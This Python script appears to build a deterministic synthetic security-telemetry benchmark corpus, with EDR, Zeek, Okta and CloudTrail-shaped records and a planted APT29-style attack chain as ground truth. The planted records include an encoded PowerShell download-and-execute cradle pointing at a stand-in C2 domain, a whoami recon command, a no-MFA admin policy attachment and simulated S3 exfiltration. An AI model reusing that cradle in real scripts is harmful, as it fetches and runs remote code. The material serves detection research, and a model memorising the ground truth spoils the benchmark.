"""Deterministic multi-source security-telemetry corpus with a planted attack chain.

This is the *build-once* testbed behind BENCH-A (OCSF context-collapse) and the
shared corpus for BENCH-B (mapping oracle) and BENCH-C (semantic-query
head-to-head). It emits four raw, native-shaped source streams — EDR/Sysmon,
Zeek/NDR (conn + dns), Okta (auth + sessions), and cloud audit (CloudTrail-shaped)
— with a six-stage APT29-style chain planted inside realistic background noise,
plus the three ground-truth artifacts the pre-registration requires.

The raw streams stay in their *native* shape on purpose: the OCSF normalization
(Store F atomic-grain vs Store N coalesced/coarse) happens in Phase 2, built blind
to the query set, so the normalization choices can't be tuned to the queries. The
raw corpus and the ground truth are pre-registered (see GENERATION-PLAN.md and the
frozen query battery), so generating them is not a degree of freedom the
experimenter gets to tune after seeing a store.

Determinism: every value is a pure function of MASTER_SEED via lib.common.new_rng
and BASE_EPOCH — no datetime.now(), no unseeded randomness. A re-run reproduces the
raw JSONL byte-for-byte and therefore reproduces every answer. The fingerprint at
the bottom is asserted identical across two generations before anything is written.

Native-shape note on absence: the no-MFA needle (A6) omits the `mfaAuthenticated`
key entirely rather than setting it false — absence is a real, distinct state. The
canonical raw is the JSONL (which preserves the omitted key); the Parquet
materialization is a query convenience for later phases and cannot carry
absent-vs-null, which is itself part of what Store N loses and Store F keeps.
"""

import argparse
import base64
import hashlib
import json
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "lib"))
from common import BASE_EPOCH, MASTER_SEED, canonical, new_rng  # noqa: E402

HERE = os.path.dirname(os.path.abspath(__file__))
WORK = os.path.join(HERE, "_work")
DAY_S = 86_400


def ms(epoch_s: float) -> int:
    """Unix seconds → integer milliseconds (the time grain the stores use)."""
    return int(round(epoch_s * 1000))


# --------------------------------------------------------------------------- #
# Registries — small, fixed vocabularies so background tallies are meaningful  #
# (R1-R6) without the corpus being enormous.                                   #
# --------------------------------------------------------------------------- #

# Source countries for auth, with a deliberately uneven failure profile so R3
# (failed-login by country) has structure. (weight, failure_rate)
COUNTRIES = [
    ("US", 0.42, 0.05), ("DE", 0.12, 0.05), ("GB", 0.10, 0.06),
    ("IN", 0.09, 0.07), ("BR", 0.07, 0.09), ("JP", 0.06, 0.04),
    ("FR", 0.05, 0.05), ("NG", 0.04, 0.22), ("RU", 0.03, 0.28),
    ("CN", 0.02, 0.26),
]

# Common process images for R5 (process executions by image name).
IMAGES = [
    "chrome.exe", "msedge.exe", "outlook.exe", "winword.exe", "excel.exe",
    "teams.exe", "svchost.exe", "explorer.exe", "cmd.exe", "powershell.exe",
    "python.exe", "code.exe", "notepad.exe", "taskhostw.exe", "rundll32.exe",
    "conhost.exe", "searchindexer.exe", "wininit.exe", "lsass.exe", "services.exe",
]

# Cloud services for R6 (API call volume by service per day) — CloudTrail
# eventSource short names + a representative read/write eventName each.
CLOUD_SERVICES = [
    ("s3", ["GetObject", "PutObject", "ListBucket", "HeadObject"]),
    ("iam", ["GetUser", "ListRoles", "CreatePolicyVersion", "AttachUserPolicy"]),
    ("ec2", ["DescribeInstances", "RunInstances", "DescribeVolumes"]),
    ("sts", ["GetCallerIdentity", "AssumeRole", "GetSessionToken"]),
    ("cloudtrail", ["LookupEvents", "DescribeTrails"]),
    ("lambda", ["Invoke", "ListFunctions"]),
    ("kms", ["Decrypt", "GenerateDataKey"]),
    ("logs", ["GetLogEvents", "FilterLogEvents"]),
]

PORTS = [80, 443, 22, 53, 3389, 445, 8080, 3306, 25, 123, 389, 636]
# Port pick weights — 443/80 dominate so R2 (top dst ports) has real heavy hitters.
PORT_WEIGHTS = [0.30, 0.34, 0.04, 0.08, 0.05, 0.04, 0.03, 0.02, 0.02, 0.04, 0.02, 0.02]

# --------------------------------------------------------------------------- #
# The compromised identity + the assets it touches. These constants are the    #
# spine of A5 (identity closure) and A9 (asset-identity collapse): one human    #
# wears an endpoint SID, an IAM principal, and a cloud assumed-role, and the    #
# machines appear as hostname (EDR), IP (NDR), and instance-id (cloud).         #
# --------------------------------------------------------------------------- #

ACTOR = {
    "human": "h_jdoe",
    "sid": "S-1-5-21-3623811015-3361044348-30300820-1107",
    "account": "ACME\\jdoe",
    "upn": "jdoe@acme.example",
    "iam_principal": "arn:aws:iam::123456789012:user/jdoe",
    "assumed_role": "arn:aws:sts::123456789012:assumed-role/AdminRole/jdoe-session",
}

WS1 = {"hostname": "WS1", "ip": "10.10.1.21", "instance_id": "i-0a1b2c3d4e5f6071"}
WS2 = {"hostname": "WS2", "ip": "10.10.1.22", "instance_id": "i-0e4f5a6b7c8d9012"}

C2_DOMAIN = "cdn-telemetry-sync.net"
C2_IP = "203.0.113.66"
SENSITIVE_BUCKET = "acme-financials-prod"

# The exact PowerShell payload A2 must recover verbatim (grain-loss: detail-gone
# under coarse normalization, retained at atomic grain).
_PS_PLAINTEXT = (
    "IEX (New-Object Net.WebClient).DownloadString('https://"
    + C2_DOMAIN
    + "/s')"
)
PS_ENCODED = base64.b64encode(_PS_PLAINTEXT.encode("utf-16-le")).decode("ascii")

SCALES = {
    "full": dict(users=300, days=14, auth_per_user_day=6, n_hosts=80,
                 conn=60_000, dns=18_000, process=40_000, cloud=28_000, sessions=4_000),
    "smoke": dict(users=40, days=7, auth_per_user_day=4, n_hosts=20,
                  conn=4_000, dns=1_500, process=3_000, cloud=2_000, sessions=400),
}


def _weighted(rng, items, weights):
    return rng.choices(items, weights=weights, k=1)[0]


def _background_host(i, n_hosts):
    """Background workstation hostname/ip. WS1/WS2 are reserved for the chain."""
    h = 3 + (i % n_hosts)
    return f"WS{h}", f"10.10.{1 + (h // 254)}.{h % 254}"


# --------------------------------------------------------------------------- #
# Background generators — one per native source. Each returns a list of dicts   #
# in source-native shape, every record carrying _src / _event_time_ms /         #
# _ingest_time_ms / _needle_id(None) plus a stable _uid.                        #
# --------------------------------------------------------------------------- #

# Background reseed offset for robustness runs: shifts the BACKGROUND generators only (not the
# planted chain at new_rng(200)+, which stays fixed), so a re-run draws different noise around the
# same needles. Default 0 reproduces the canonical corpus exactly.
BG_SEED_OFFSET = 0


def gen_auth(cfg):
    """Okta-shaped sign-in events → R1 (per user/day), R3 (failed by country)."""
    rng = new_rng(101 + BG_SEED_OFFSET)
    countries = [c[0] for c in COUNTRIES]
    cweights = [c[1] for c in COUNTRIES]
    cfail = {c[0]: c[2] for c in COUNTRIES}
    out = []
    n = 0
    for u in range(cfg["users"]):
        user = f"user{u:04d}@acme.example"
        home = _weighted(rng, countries, cweights)
        for d in range(cfg["days"]):
            for _ in range(rng.randint(1, cfg["auth_per_user_day"] * 2)):
                country = home if rng.random() < 0.9 else rng.choice(countries)
                t = BASE_EPOCH + d * DAY_S + rng.randint(0, DAY_S - 1)
                failed = rng.random() < cfail[country]
                out.append({
                    "_src": "okta_auth", "_uid": f"auth-{n:07d}", "_needle_id": None,
                    "_event_time_ms": ms(t), "_ingest_time_ms": ms(t + rng.randint(1, 8)),
                    "actor_user": user, "src_country": country,
                    "src_ip": f"198.51.{rng.randint(0,255)}.{rng.randint(1,254)}",
                    "outcome": "FAILURE" if failed else "SUCCESS",
                    "event_type": "user.session.start",
                })
                n += 1
    return out


def gen_sessions(cfg):
    """Sign-in sessions with start+end (valid-time) → A4 point-in-time support."""
    rng = new_rng(106 + BG_SEED_OFFSET)
    out = []
    for s in range(cfg["sessions"]):
        u = f"user{rng.randint(0, cfg['users']-1):04d}@acme.example"
        d = rng.randint(0, cfg["days"] - 1)
        start = BASE_EPOCH + d * DAY_S + rng.randint(0, DAY_S - 3600)
        dur = rng.randint(300, 6 * 3600)
        out.append({
            "_src": "okta_session", "_uid": f"sess-{s:06d}", "_needle_id": None,
            "_event_time_ms": ms(start), "_ingest_time_ms": ms(start + rng.randint(1, 8)),
            "actor_user": u, "host": _background_host(rng.randint(0, 10_000), cfg["n_hosts"])[0],
            "start_time_ms": ms(start), "end_time_ms": ms(start + dur),
        })
    return out


def gen_conn(cfg):
    """Zeek conn.log → R2 (top dst ports), R4 (egress bytes per host/day)."""
    rng = new_rng(102 + BG_SEED_OFFSET)
    out = []
    for i in range(cfg["conn"]):
        host, ip = _background_host(i, cfg["n_hosts"])
        d = rng.randint(0, cfg["days"] - 1)
        t = BASE_EPOCH + d * DAY_S + rng.randint(0, DAY_S - 1)
        port = _weighted(rng, PORTS, PORT_WEIGHTS)
        out.append({
            "_src": "zeek_conn", "_uid": f"conn-{i:07d}", "_needle_id": None,
            "_event_time_ms": ms(t), "_ingest_time_ms": ms(t + rng.randint(0, 5)),
            "orig_h": ip, "orig_host": host,
            "resp_h": f"93.184.{rng.randint(0,255)}.{rng.randint(1,254)}",
            "resp_p": port, "proto": "tcp",
            "orig_bytes": rng.randint(40, 250_000), "resp_bytes": rng.randint(40, 900_000),
            "duration": round(rng.uniform(0.01, 120.0), 3),
        })
    return out


def gen_dns(cfg):
    """Zeek dns.log → background for A8 first-seen (the C2 domain is the needle)."""
    rng = new_rng(103 + BG_SEED_OFFSET)
    tlds = ["com", "net", "org", "io", "co"]
    words = ["cdn", "api", "mail", "update", "static", "img", "auth", "cloud",
             "vpn", "sync", "telemetry", "metrics", "assets", "edge"]
    out = []
    for i in range(cfg["dns"]):
        host, ip = _background_host(i, cfg["n_hosts"])
        d = rng.randint(0, cfg["days"] - 1)
        t = BASE_EPOCH + d * DAY_S + rng.randint(0, DAY_S - 1)
        dom = f"{rng.choice(words)}-{rng.choice(words)}.{rng.choice(tlds)}"
        out.append({
            "_src": "zeek_dns", "_uid": f"dns-{i:07d}", "_needle_id": None,
            "_event_time_ms": ms(t), "_ingest_time_ms": ms(t + rng.randint(0, 5)),
            "orig_h": ip, "orig_host": host, "query": dom, "qtype": "A",
            "answer": f"93.184.{rng.randint(0,255)}.{rng.randint(1,254)}",
        })
    return out


def gen_process(cfg):
    """Sysmon process-creation (EventID 1) → R5 (top images)."""
    rng = new_rng(104 + BG_SEED_OFFSET)
    out = []
    for i in range(cfg["process"]):
        host, ip = _background_host(i, cfg["n_hosts"])
        d = rng.randint(0, cfg["days"] - 1)
        t = BASE_EPOCH + d * DAY_S + rng.randint(0, DAY_S - 1)
        img = rng.choice(IMAGES)
        out.append({
            "_src": "sysmon_process", "_uid": f"proc-{i:07d}", "_needle_id": None,
            "_event_time_ms": ms(t), "_ingest_time_ms": ms(t + rng.randint(0, 30)),
            "host": host, "user_sid": f"S-1-5-21-3623811015-3361044348-30300820-{1200+rng.randint(0,800)}",
            "image": f"C:\\Windows\\System32\\{img}", "image_name": img,
            "command_line": f"{img}", "parent_image_name": rng.choice(IMAGES),
            "process_id": 1000 + (i % 60000),
        })
    return out


def gen_cloud(cfg):
    """CloudTrail-shaped API events → R6 (API volume by service per day)."""
    rng = new_rng(105 + BG_SEED_OFFSET)
    out = []
    for i in range(cfg["cloud"]):
        svc, names = rng.choice(CLOUD_SERVICES)
        d = rng.randint(0, cfg["days"] - 1)
        t = BASE_EPOCH + d * DAY_S + rng.randint(0, DAY_S - 1)
        out.append({
            "_src": "cloudtrail", "_uid": f"api-{i:07d}", "_needle_id": None,
            "_event_time_ms": ms(t), "_ingest_time_ms": ms(t + rng.randint(1, 20)),
            "event_source": f"{svc}.amazonaws.com", "event_name": rng.choice(names),
            "principal": f"arn:aws:iam::123456789012:user/user{rng.randint(0, cfg['users']-1):04d}",
            "src_ip": f"52.{rng.randint(0,255)}.{rng.randint(0,255)}.{rng.randint(1,254)}",
            "mfaAuthenticated": rng.random() < 0.7,
            "aws_region": rng.choice(["us-east-1", "us-west-2", "eu-west-1"]),
        })
    return out


# --------------------------------------------------------------------------- #
# The planted chain. Injects the six-stage needle set at pre-registered true    #
# event-times and returns (records-by-source, ground_truth).                    #
# --------------------------------------------------------------------------- #

def plant_chain(cfg):
    rng = new_rng(200)
    streams = {k: [] for k in (
        "cloudtrail", "sysmon_process", "zeek_conn", "zeek_dns", "okta_session", "okta_auth")}

    chain_day = cfg["days"] // 2
    t0 = BASE_EPOCH + chain_day * DAY_S + 10 * 3600  # 10:00:00Z on the chain day

    def at(off_s):
        return ms(t0 + off_s)

    truth_needles = {}

    # Stage 0 — initial access: OAuth/session token issuance after consent.
    n0 = {"_src": "cloudtrail", "_uid": "api-needle-0", "_needle_id": "stage0_oauth",
          "_event_time_ms": at(0), "_ingest_time_ms": at(12),
          "event_source": "sts.amazonaws.com", "event_name": "GetSessionToken",
          "principal": ACTOR["iam_principal"], "src_ip": "203.0.113.7",
          "mfaAuthenticated": False, "aws_region": "us-east-1"}
    streams["cloudtrail"].append(n0)

    # Stage 1 — execution: encoded PowerShell, parent = Office app, on WS1.
    n1 = {"_src": "sysmon_process", "_uid": "proc-needle-1", "_needle_id": "stage1_powershell",
          "_event_time_ms": at(300), "_ingest_time_ms": at(305),
          "host": WS1["hostname"], "user_sid": ACTOR["sid"],
          "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
          "image_name": "powershell.exe",
          "command_line": f"powershell.exe -NoProfile -EncodedCommand {PS_ENCODED}",
          "parent_image_name": "winword.exe", "process_id": 6042}
    streams["sysmon_process"].append(n1)
    truth_needles["powershell_proc_uid"] = n1["_uid"]
    truth_needles["powershell_encoded_cmd"] = PS_ENCODED

    # Stage 2 — C2 beacon: ~60s periodic, low-byte conns WS1 → newly-seen domain,
    # over ~1h. Plus the first DNS resolution of the C2 domain (A8 first-seen).
    beacon_uids = []
    dns_c2 = {"_src": "zeek_dns", "_uid": "dns-needle-c2", "_needle_id": "stage2_c2_dns",
              "_event_time_ms": at(470), "_ingest_time_ms": at(472),
              "orig_h": WS1["ip"], "orig_host": WS1["hostname"],
              "query": C2_DOMAIN, "qtype": "A", "answer": C2_IP}
    streams["zeek_dns"].append(dns_c2)
    truth_needles["c2_domain"] = C2_DOMAIN
    truth_needles["c2_first_seen_ms"] = at(470)
    for k in range(60):
        off = 480 + k * 60 + rng.randint(-2, 2)  # ~60s cadence with tiny jitter
        uid = f"conn-needle-beacon-{k:02d}"
        streams["zeek_conn"].append({
            "_src": "zeek_conn", "_uid": uid, "_needle_id": "stage2_beacon",
            "_event_time_ms": at(off), "_ingest_time_ms": at(off + 2),
            "orig_h": WS1["ip"], "orig_host": WS1["hostname"], "resp_h": C2_IP,
            "resp_p": 443, "proto": "tcp",
            "orig_bytes": rng.randint(180, 520), "resp_bytes": rng.randint(180, 640),
            "duration": round(rng.uniform(0.2, 1.5), 3)})
        beacon_uids.append(uid)
    truth_needles["beacon_conn_uids"] = beacon_uids

    # A10 — late-arriving (buffered) EDR event: true event_time inside the chain,
    # ingestion ~1h later (offline agent). Store N keying on ingest time misclassifies it.
    nlate = {"_src": "sysmon_process", "_uid": "proc-needle-late", "_needle_id": "late_arrival",
             "_event_time_ms": at(1800), "_ingest_time_ms": at(1800 + 3600),
             "host": WS1["hostname"], "user_sid": ACTOR["sid"],
             "image": "C:\\Windows\\System32\\cmd.exe", "image_name": "cmd.exe",
             "command_line": "cmd.exe /c whoami /all", "parent_image_name": "powershell.exe",
             "process_id": 6101}
    streams["sysmon_process"].append(nlate)
    truth_needles["late_arrival_proc_uid"] = nlate["_uid"]
    truth_needles["late_arrival_event_time_ms"] = nlate["_event_time_ms"]
    truth_needles["late_arrival_ingest_time_ms"] = nlate["_ingest_time_ms"]

    # Stage 3 — lateral movement WS1 → WS2 (RDP/SMB): EDR auth + NDR connection.
    n3_auth = {"_src": "okta_auth", "_uid": "auth-needle-lateral", "_needle_id": "stage3_lateral_auth",
               "_event_time_ms": at(4200), "_ingest_time_ms": at(4205),
               "actor_user": ACTOR["upn"], "src_country": "US", "src_ip": WS1["ip"],
               "outcome": "SUCCESS", "event_type": "host.logon.remote",
               "target_host": WS2["hostname"]}
    streams["okta_auth"].append(n3_auth)
    n3_conn = {"_src": "zeek_conn", "_uid": "conn-needle-lateral", "_needle_id": "stage3_lateral_conn",
               "_event_time_ms": at(4205), "_ingest_time_ms": at(4207),
               "orig_h": WS1["ip"], "orig_host": WS1["hostname"], "resp_h": WS2["ip"],
               "resp_p": 3389, "proto": "tcp", "orig_bytes": 12_400, "resp_bytes": 88_200,
               "duration": 410.2}
    streams["zeek_conn"].append(n3_conn)
    truth_needles["lateral_auth_uid"] = n3_auth["_uid"]
    truth_needles["lateral_conn_uid"] = n3_conn["_uid"]

    # Stage 4 — priv-esc without MFA: AttachUserPolicy(Admin), mfaAuthenticated ABSENT.
    # Note: the key is omitted entirely (absence != false). This is the structural needle.
    n4 = {"_src": "cloudtrail", "_uid": "api-needle-nomfa", "_needle_id": "stage4_nomfa",
          "_event_time_ms": at(4800), "_ingest_time_ms": at(4815),
          "event_source": "iam.amazonaws.com", "event_name": "AttachUserPolicy",
          "principal": ACTOR["iam_principal"], "src_ip": "203.0.113.7",
          "policy_arn": "arn:aws:iam::aws:policy/AdministratorAccess",
          "aws_region": "us-east-1"}
    # deliberately NO "mfaAuthenticated" key
    streams["cloudtrail"].append(n4)
    truth_needles["nomfa_event_uid"] = n4["_uid"]

    # Stage 5 — identity pivot: the same human across endpoint SID + IAM principal +
    # cloud assumed-role. Captured by the identity links (below) plus one assumed-role
    # event tying the SID-bearing actor to the assumed role.
    n5 = {"_src": "cloudtrail", "_uid": "api-needle-assumerole", "_needle_id": "stage5_assumerole",
          "_event_time_ms": at(5400), "_ingest_time_ms": at(5412),
          "event_source": "sts.amazonaws.com", "event_name": "AssumeRole",
          "principal": ACTOR["assumed_role"], "src_ip": "203.0.113.7",
          "mfaAuthenticated": False, "aws_region": "us-east-1"}
    streams["cloudtrail"].append(n5)

    # Stage 6 — exfil: burst of GetObject on a sensitive bucket.
    exfil_uids = []
    for k in range(30):
        off = 6000 + k * 5
        uid = f"api-needle-exfil-{k:02d}"
        streams["cloudtrail"].append({
            "_src": "cloudtrail", "_uid": uid, "_needle_id": "stage6_exfil",
            "_event_time_ms": at(off), "_ingest_time_ms": at(off + 10),
            "event_source": "s3.amazonaws.com", "event_name": "GetObject",
            "principal": ACTOR["assumed_role"], "src_ip": "203.0.113.7",
            "resource": f"arn:aws:s3:::{SENSITIVE_BUCKET}/q3/file_{k:03d}.xlsx",
            "mfaAuthenticated": False, "aws_region": "us-east-1"})
        exfil_uids.append(uid)
    truth_needles["exfil_event_uids"] = exfil_uids

    # A4 — point-in-time: the attacker's session on WS1 spanning 14:03:00Z on the
    # chain day, planted among background sessions. Truth set computed at write time.
    pit = BASE_EPOCH + chain_day * DAY_S + 14 * 3600 + 3 * 60  # 14:03:00Z
    sess_start = BASE_EPOCH + chain_day * DAY_S + 13 * 3600 + 30 * 60
    sess_end = BASE_EPOCH + chain_day * DAY_S + 14 * 3600 + 30 * 60
    nsess = {"_src": "okta_session", "_uid": "sess-needle-ws1", "_needle_id": "pit_session",
             "_event_time_ms": ms(sess_start), "_ingest_time_ms": ms(sess_start + 4),
             "actor_user": ACTOR["upn"], "host": WS1["hostname"],
             "start_time_ms": ms(sess_start), "end_time_ms": ms(sess_end)}
    streams["okta_session"].append(nsess)
    truth_needles["pit_point_ms"] = ms(pit)
    truth_needles["pit_session_uid"] = nsess["_uid"]

    # --- ground-truth artifacts the pre-registration names (§2) ---------------
    truth_event_order = [
        "stage0_oauth", "stage1_powershell", "stage2_beacon",
        "stage3_lateral_conn", "stage4_nomfa", "stage5_assumerole", "stage6_exfil",
    ]
    truth_identity_links = {
        "human": ACTOR["human"],
        "endpoint_sid": ACTOR["sid"], "account": ACTOR["account"], "upn": ACTOR["upn"],
        "iam_principal": ACTOR["iam_principal"], "assumed_role": ACTOR["assumed_role"],
        "assets": [WS1, WS2],
    }
    # A9 distinct-asset truth: the actor touched two physical machines, each of which
    # appears under three identifiers (hostname / ip / instance-id). A flattened store
    # over- or under-counts; the truth is 2.
    truth_needles["distinct_assets"] = [WS1, WS2]
    truth_needles["distinct_asset_count"] = 2
    truth_needles["actor_human"] = ACTOR["human"]
    # A7 dwell time: first execution (stage 1) → lateral movement (stage 3).
    truth_needles["dwell_seconds"] = int((n3_conn["_event_time_ms"] - n1["_event_time_ms"]) / 1000)

    ground_truth = {
        "chain_day_index": chain_day,
        "chain_t0_ms": ms(t0),
        "truth_event_order": truth_event_order,
        "truth_identity_links": truth_identity_links,
        "truth_needles": truth_needles,
    }
    return streams, ground_truth


# --------------------------------------------------------------------------- #
# Assembly, writing, fingerprint                                                #
# --------------------------------------------------------------------------- #

def build(cfg):
    """Return ({source: [records...]}, ground_truth) — background + planted chain."""
    streams = {
        "okta_auth": gen_auth(cfg),
        "okta_session": gen_sessions(cfg),
        "zeek_conn": gen_conn(cfg),
        "zeek_dns": gen_dns(cfg),
        "sysmon_process": gen_process(cfg),
        "cloudtrail": gen_cloud(cfg),
    }
    needle_streams, ground_truth = plant_chain(cfg)
    for src, recs in needle_streams.items():
        streams[src].extend(recs)
    # Sort each stream by (event_time, uid) for a stable, inspectable order.
    for src in streams:
        streams[src].sort(key=lambda r: (r["_event_time_ms"], r["_uid"]))

    # A4 truth: which sessions are active at the point-in-time instant (needs the
    # full session set, so computed here after assembly).
    pit = ground_truth["truth_needles"]["pit_point_ms"]
    active = [s["_uid"] for s in streams["okta_session"]
              if s["start_time_ms"] <= pit <= s["end_time_ms"]]
    ground_truth["truth_needles"]["pit_active_session_uids"] = sorted(active)
    return streams, ground_truth


def fingerprint(streams, ground_truth) -> str:
    """Order-independent content hash over every record + the ground truth.

    Absence-sensitive: hashes the canonical JSON of each record, so the omitted
    `mfaAuthenticated` key on the no-MFA needle changes the digest distinctly from
    an explicit false. Two builds of the same scale must produce the same hash.
    """
    h = hashlib.sha256()
    for src in sorted(streams):
        acc = 0
        for r in streams[src]:
            d = int(hashlib.sha256(canonical(r).encode()).hexdigest(), 16)
            acc = (acc + d) % (2 ** 128)  # commutative → order-independent
        h.update(f"{src}:{len(streams[src])}:{acc}".encode())
    h.update(canonical(ground_truth).encode())
    return h.hexdigest()


def write(streams, ground_truth, scale):
    raw_dir = os.path.join(WORK, "raw")
    os.makedirs(raw_dir, exist_ok=True)
    counts = {}
    for src, recs in streams.items():
        path = os.path.join(raw_dir, f"{src}.jsonl")
        with open(path, "w") as f:
            for r in recs:
                f.write(json.dumps(r) + "\n")  # insertion-order → deterministic bytes
        counts[src] = len(recs)
    with open(os.path.join(WORK, "ground_truth.json"), "w") as f:
        json.dump(ground_truth, f, indent=2, sort_keys=True)
    manifest = {
        "scale": scale, "counts": counts, "total_events": sum(counts.values()),
        "fingerprint_sha256": fingerprint(streams, ground_truth),
        "master_seed": MASTER_SEED,
        "base_epoch": BASE_EPOCH,
    }
    with open(os.path.join(WORK, "manifest.json"), "w") as f:
        json.dump(manifest, f, indent=2, sort_keys=True)
    return manifest


def materialize_parquet():
    """Optional convenience: load each raw JSONL into DuckDB and COPY to Parquet
    for the later query phases. Not the canonical raw (absence is lost in a typed
    column); the JSONL is canonical. Skipped silently if duckdb is unavailable."""
    try:
        import duckdb
    except ImportError:
        return None
    raw_dir = os.path.join(WORK, "raw")
    pq_dir = os.path.join(WORK, "parquet")
    os.makedirs(pq_dir, exist_ok=True)
    con = duckdb.connect(":memory:")
    written = []
    for fn in sorted(os.listdir(raw_dir)):
        if not fn.endswith(".jsonl"):
            continue
        src = fn[:-6]
        src_path = os.path.join(raw_dir, fn).replace("'", "''")
        out_path = os.path.join(pq_dir, f"{src}.parquet").replace("'", "''")
        # sample_size=-1: infer types over the whole file, not the first 20k rows —
        # the sparse string columns (e.g. _needle_id, null until the mid-corpus chain)
        # would otherwise be typed JSON instead of VARCHAR.
        con.execute(
            f"COPY (SELECT * FROM read_json_auto('{src_path}', sample_size=-1)) "
            f"TO '{out_path}' (FORMAT parquet)")
        written.append(src)
    return written


def main():
    ap = argparse.ArgumentParser(description="Generate the OCSF semantic testbed corpus.")
    ap.add_argument("--scale", choices=list(SCALES), default="full")
    ap.add_argument("--no-write", action="store_true", help="determinism check only")
    ap.add_argument("--no-parquet", action="store_true", help="skip the Parquet convenience materialization")
    args = ap.parse_args()
    cfg = SCALES[args.scale]

    # Determinism guarantee: build twice, assert identical fingerprint, before writing.
    s1, g1 = build(cfg)
    s2, g2 = build(cfg)
    fp1, fp2 = fingerprint(s1, g1), fingerprint(s2, g2)
    deterministic = fp1 == fp2
    print(f"scale={args.scale}  total_events={sum(len(v) for v in s1.values())}")
    print(f"determinism: {'OK' if deterministic else 'FAIL'}  fingerprint={fp1[:16]}…")
    if not deterministic:
        print(f"  fp1={fp1}\n  fp2={fp2}", file=sys.stderr)
        sys.exit(1)

    # Ground-truth sanity: the needle sets the query battery references must exist.
    tn = g1["truth_needles"]
    need = ["beacon_conn_uids", "powershell_proc_uid", "nomfa_event_uid",
            "exfil_event_uids", "late_arrival_proc_uid", "c2_domain",
            "pit_active_session_uids", "distinct_asset_count", "dwell_seconds"]
    missing = [k for k in need if k not in tn]
    assert not missing, f"ground truth missing needle keys: {missing}"
    assert tn["pit_session_uid"] in tn["pit_active_session_uids"], "PIT needle session not active at the instant"
    assert len(tn["beacon_conn_uids"]) == 60, "beacon count drift"
    print(f"ground truth: {len(g1['truth_event_order'])} ordered stages, "
          f"{len(tn['beacon_conn_uids'])} beacon conns, dwell={tn['dwell_seconds']}s, OK")

    if args.no_write:
        return
    manifest = write(s1, g1, args.scale)
    print(f"wrote raw JSONL + ground_truth.json + manifest.json to {WORK}")
    print(f"  counts: {manifest['counts']}")
    if not args.no_parquet:
        pq = materialize_parquet()
        print(f"  parquet: {'materialized ' + ', '.join(pq) if pq else 'skipped (duckdb unavailable)'}")


if __name__ == "__main__":
    main()
